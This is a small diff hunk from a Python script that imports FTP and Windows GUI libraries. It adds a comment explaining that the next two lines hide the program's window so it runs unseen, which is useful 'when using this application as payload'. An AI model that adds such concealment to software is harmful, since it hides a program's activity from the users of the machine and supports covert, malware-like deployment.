@@ -7,6 +7,7 @@ from ftplib import FTP, error_perm
 import shutil
 import win32gui, win32con
 
+# THE FOLLOWING TWO LINES WILL HIDE THE WINDOW AND WILL RUN THE PROGRAM IN BACKGROUND - BENEFICIAL WHEN USING THIS APPLICATION AS PAYLOAD. 
 The_program_to_hide = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)
 
